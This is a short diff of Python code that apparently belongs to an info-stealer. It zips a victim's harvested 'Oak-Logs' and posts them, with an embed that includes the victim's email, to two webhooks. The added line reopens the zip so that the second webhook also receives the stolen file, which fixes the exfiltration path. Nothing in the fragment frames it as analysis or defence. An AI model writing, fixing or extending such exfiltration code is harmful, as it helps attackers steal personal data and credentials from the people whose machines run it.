@@ -919,6 +919,7 @@ Email: {email if email else ""}\n"""
      with open(f'Oak-Logs-{pc_username}.zip', 'rb') as f:
         requests.post(webhook, json = embed)
         requests.post(webhook,data=file ,files={'upload_file': f})
+     with open(f'Oak-Logs-{pc_username}.zip', 'rb') as f:
         requests.post(webhook2, json = embed)
         requests.post(webhook2,data=file ,files={'upload_file': f})
     def cleanup():
